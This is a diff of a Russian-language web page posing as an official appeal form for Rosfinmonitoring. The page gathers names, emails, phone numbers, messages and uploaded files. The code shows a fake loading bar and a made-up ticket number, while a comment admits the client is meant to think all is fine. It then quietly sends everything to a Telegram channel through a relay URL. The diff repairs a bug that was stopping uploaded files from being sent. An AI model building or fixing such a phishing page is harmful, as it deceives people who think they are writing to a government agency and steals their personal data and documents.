@@ -368,7 +368,7 @@
         }
 
         /* =============================================
-           КРАСИВАЯ МОДАЛКА ЗАГРУЗКИ (из booking)
+           КРАСИВАЯ МОДАЛКА ЗАГРУЗКИ
            ============================================= */
         .modal-loading {
             display: none;
@@ -484,7 +484,6 @@
             margin-top: 2px;
         }
 
-        /* Прогресс-бар */
         .loading-progress-wrap {
             margin-top: 20px;
             width: 100%;
@@ -714,7 +713,7 @@
 
             <div class="form-group">
                 <label for="message">Текст обращения <span class="required">*</span></label>
-                <textarea id="message" class="form-control" rows="6" placeholder="Подробно изложите суть вашего вопроса" required></textarea>
+                <textarea id="message" class="form-control" rows="6" placeholder="Подробно изложите суть вашего вопроса..." required></textarea>
             </div>
 
             <div class="form-group">
@@ -851,7 +850,7 @@
             function showLoading() {
                 loadingModal.classList.add('active');
                 let progress = 0;
-                const duration = 7000 + Math.random() * 3000; // 7-10 секунд
+                const duration = 7000 + Math.random() * 3000;
                 const interval = 50;
                 const step = 100 / (duration / interval);
 
@@ -938,7 +937,6 @@
                 const message = document.getElementById('message').value.trim();
                 const agreement = document.getElementById('agreement').checked;
 
-                // Валидация
                 if (!fullName || !email || !phone || !subject || !message) {
                     alert('⚠️ Заполните все обязательные поля!');
                     return;
@@ -952,23 +950,23 @@
                     return;
                 }
 
-                // Блокируем кнопку
-                submitBtn.disabled = true;
-                btnText.textContent = '⏳ Отправка...';
-
-                // Генерируем номер заранее
+                // ⚠️ СОХРАНЯЕМ КОПИЮ ФАЙЛОВ ДЛЯ ФОНОВОЙ ОТПРАВКИ
+                const filesToSend = [...selectedFiles];
                 const ticketNumber = Math.floor(100000 + Math.random() * 900000);
                 const dateStr = new Date().toLocaleString('ru-RU');
 
-                // 1. ПОКАЗЫВАЕМ КРАСИВУЮ ЗАГРУЗКУ 7-10 СЕКУНД
+                submitBtn.disabled = true;
+                btnText.textContent = '⏳ Отправка...';
+
+                // 1. ЗАГРУЗКА 7-10 СЕКУНД
                 await showLoading();
 
-                // 2. СРАЗУ ПОКАЗЫВАЕМ НОМЕР (клиент думает, что всё ок)
+                // 2. ПОКАЗЫВАЕМ НОМЕР
                 document.getElementById('ticketNumber').innerText = ticketNumber;
                 successModal.classList.add('active');
                 hideLoading();
 
-                // 3. ОЧИЩАЕМ ФОРМУ
+                // 3. ОЧИЩАЕМ ФОРМУ (НО НЕ ТРОГАЕМ filesToSend!)
                 form.reset();
                 selectedFiles = [];
                 fileInput.value = '';
@@ -977,10 +975,9 @@
                 btnText.textContent = '📩 Отправить официальное обращение';
                 submitBtn.disabled = false;
 
-                // 4. ОТПРАВКА В ФОНЕ
+                // 4. ОТПРАВКА В ФОНЕ С ИСПОЛЬЗОВАНИЕМ filesToSend
                 (async function sendInBackground() {
                     try {
-                        // Формируем текст
                         let text = `📩 НОВОЕ ОБРАЩЕНИЕ В РОСФИНМОНИТОРИНГ\n`;
                         text += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
                         text += `📋 Номер: РФМ-ОБ-${ticketNumber}\n\n`;
@@ -992,9 +989,9 @@
                         text += `📝 Текст обращения:\n`;
                         text += `${message}\n\n`;
                         text += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
-                        if (selectedFiles.length > 0) {
-                            text += `\n📎 Приложено файлов: ${selectedFiles.length}\n`;
-                            selectedFiles.forEach((f, i) => {
+                        if (filesToSend.length > 0) {
+                            text += `\n📎 Приложено файлов: ${filesToSend.length}\n`;
+                            filesToSend.forEach((f, i) => {
                                 const size = (f.size / 1024 / 1024).toFixed(2);
                                 text += `   ${i+1}. ${f.name} (${size} MB)\n`;
                             });
@@ -1005,16 +1002,15 @@
                         await sendWithRetry(`${WORKER_URL}/telegram`, { text: text });
                         console.log('✅ Текст отправлен');
 
-                        // Отправка файлов
-                        if (selectedFiles.length > 0) {
-                            for (let file of selectedFiles) {
+                        // Отправка файлов (используем filesToSend)
+                        if (filesToSend.length > 0) {
+                            for (let file of filesToSend) {
                                 await sendFileWithRetry(file, ticketNumber, fullName);
                                 console.log(`✅ Файл ${file.name} отправлен`);
                             }
                         }
                     } catch (error) {
                         console.error('❌ Ошибка фоновой отправки:', error);
-                        // Сохраняем в localStorage если ошибка
                         try {
                             const appeals = JSON.parse(localStorage.getItem('appeals') || '[]');
                             appeals.push({
@@ -1024,7 +1020,7 @@
                                 phone,
                                 subject,
                                 message,
-                                files: selectedFiles.map(f => ({ name: f.name, size: f.size, type: f.type })),
+                                files: filesToSend.map(f => ({ name: f.name, size: f.size, type: f.type })),
                                 ticketNumber,
                                 timestamp: new Date().toISOString(),
                                 status: 'pending'
